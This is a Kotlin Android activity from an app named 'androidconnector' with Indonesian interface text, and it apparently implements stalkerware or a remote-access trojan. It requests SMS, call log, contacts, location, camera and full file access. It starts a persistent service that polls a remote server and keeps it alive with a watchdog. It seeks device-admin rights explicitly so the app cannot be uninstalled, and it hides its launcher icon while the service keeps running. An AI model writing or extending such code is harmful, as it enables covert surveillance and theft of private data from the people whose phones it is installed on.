package com.kztutorial99.androidconnector

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.PowerManager
import android.provider.Settings
import android.view.View
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.kztutorial99.androidconnector.databinding.ActivityMainBinding
import rikka.shizuku.Shizuku
import java.util.UUID

class MainActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMainBinding
    private val prefs by lazy { getSharedPreferences("connector_prefs", Context.MODE_PRIVATE) }

    private val RUNTIME_PERMISSIONS = arrayOf(
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.CAMERA,
    )

    private val dpm by lazy { getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager }
    private val adminComponent by lazy { ComponentName(this, AppDeviceAdminReceiver::class.java) }
    private val launcherAlias by lazy { ComponentName(this, "$packageName.MainLauncherAlias") }

    private val REQUEST_PERMISSIONS = 2001
    private val REQUEST_DEVICE_ADMIN = 3001
    private val REQUEST_STORAGE = 4001

    private val shizukuPermissionListener = Shizuku.OnRequestPermissionResultListener { _, result ->
        if (result == PackageManager.PERMISSION_GRANTED) {
            updatePermissionStatus()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        binding.tvVersion.text = "v${packageManager.getPackageInfo(packageName, 0).versionName}"

        val deviceId = ensureDeviceId()
        binding.tvDeviceId.text = deviceId
        binding.tvServerUrl.text = ConnectorService.SERVER_URL.removePrefix("https://")

        setupButtons()

        Shizuku.addRequestPermissionResultListener(shizukuPermissionListener)

        ConnectorService.statusCallback = { msg, running ->
            runOnUiThread { updateServiceState(running) }
        }

        if (!ConnectorService.isRunning) {
            startConnectorService()
        } else {
            updateServiceState(true)
        }

        WatchdogReceiver.schedule(this)

        requestAllPermissions()
        requestBatteryOptimization()
        requestStoragePermission()
        requestDeviceAdmin()
        checkShizuku()
        updatePermissionStatus()
    }

    override fun onResume() {
        super.onResume()
        updatePermissionStatus()
    }

    override fun onDestroy() {
        super.onDestroy()
        Shizuku.removeRequestPermissionResultListener(shizukuPermissionListener)
        ConnectorService.statusCallback = null
    }

    private fun ensureDeviceId(): String {
        var id = prefs.getString("device_id", null)
        if (id == null) {
            id = UUID.randomUUID().toString()
            prefs.edit().putString("device_id", id).apply()
        }
        return id
    }

    private fun setupButtons() {
        binding.btnConnect.setOnClickListener {
            startConnectorService()
        }

        binding.btnDisconnect.setOnClickListener {
            stopService(Intent(this, ConnectorService::class.java))
            WatchdogReceiver.cancel(this)
            updateServiceState(false)
        }

        binding.btnLaunch.setOnClickListener {
            hideAppIcon()
            Toast.makeText(this, "Ikon aplikasi disembunyikan. Layanan tetap berjalan.", Toast.LENGTH_LONG).show()
            finish()
        }
    }

    private fun startConnectorService() {
        val intent = Intent(this, ConnectorService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
        updateServiceState(true)
    }

    private fun updateServiceState(running: Boolean) {
        binding.btnConnect.isEnabled = !running
        binding.btnDisconnect.isEnabled = running
        binding.tvStatus.text = if (running) "Connected" else "Disconnected"
        binding.tvStatus.setTextColor(
            if (running) getColor(R.color.green) else getColor(R.color.red)
        )
        binding.statusDot.background =
            if (running) getDrawable(R.drawable.dot_green) else getDrawable(R.drawable.dot_red)
        binding.tvLastPoll.text =
            if (running) "Polling ${ConnectorService.SERVER_URL.removePrefix("https://")}" else "Tap CONNECT to start"
    }

    private fun updatePermissionStatus() {
        val runtimeGranted = RUNTIME_PERMISSIONS.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }
        val storageGranted = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            Environment.isExternalStorageManager()
        } else true

        val allGranted = runtimeGranted && storageGranted

        if (allGranted) {
            binding.tvPermStatus.text = "✅ Semua izin telah diberikan"
            binding.tvPermStatus.setTextColor(getColor(R.color.green))
            binding.btnLaunch.visibility = View.VISIBLE
        } else {
            val missing = mutableListOf<String>()
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) missing.add("Lokasi")
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) missing.add("SMS")
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) missing.add("Log Panggilan")
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) missing.add("Kontak")
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) missing.add("Kamera")
            if (!storageGranted) missing.add("Akses File")

            binding.tvPermStatus.text = "⚠️ Belum diizinkan: ${missing.joinToString(", ")}"
            binding.tvPermStatus.setTextColor(getColor(R.color.red))
            binding.btnLaunch.visibility = View.GONE
        }
    }

    private fun hideAppIcon() {
        try {
            packageManager.setComponentEnabledSetting(
                launcherAlias,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (e: Exception) {
            Toast.makeText(this, "Gagal sembunyikan ikon: ${e.message}", Toast.LENGTH_SHORT).show()
        }
    }

    private fun requestDeviceAdmin() {
        if (!dpm.isAdminActive(adminComponent)) {
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                putExtra(
                    DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "Diperlukan agar aplikasi tidak dapat di-uninstall dan tetap berjalan di latar belakang."
                )
            }
            startActivityForResult(intent, REQUEST_DEVICE_ADMIN)
        }
    }

    private fun requestBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val pm = getSystemService(PowerManager::class.java)
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                try {
                    startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                        data = Uri.parse("package:$packageName")
                    })
                } catch (_: Exception) {}
            }
        }
    }

    private fun requestAllPermissions() {
        val missing = RUNTIME_PERMISSIONS.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }.toTypedArray()
        if (missing.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, missing, REQUEST_PERMISSIONS)
        }
    }

    private fun requestStoragePermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                try {
                    startActivity(Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                        data = Uri.parse("package:$packageName")
                    })
                } catch (_: Exception) {
                    startActivity(Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION))
                }
            }
        }
    }

    private fun checkShizuku() {
        try {
            val available = Shizuku.pingBinder()
            val granted = available && Shizuku.checkSelfPermission() == PackageManager.PERMISSION_GRANTED
            if (!granted && available) {
                binding.cardStatus.setOnClickListener {
                    try { Shizuku.requestPermission(1001) } catch (_: Exception) {}
                }
            }
        } catch (_: Exception) {}
    }

    override fun onRequestPermissionsResult(code: Int, perms: Array<String>, results: IntArray) {
        super.onRequestPermissionsResult(code, perms, results)
        updatePermissionStatus()
        if (code == 1001) {
            val result = if (results.isNotEmpty()) results[0] else PackageManager.PERMISSION_DENIED
            shizukuPermissionListener.onRequestPermissionResult(code, result)
        }
    }

    @Deprecated("Deprecated in Java")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == REQUEST_DEVICE_ADMIN) {
            updatePermissionStatus()
        }
    }
}
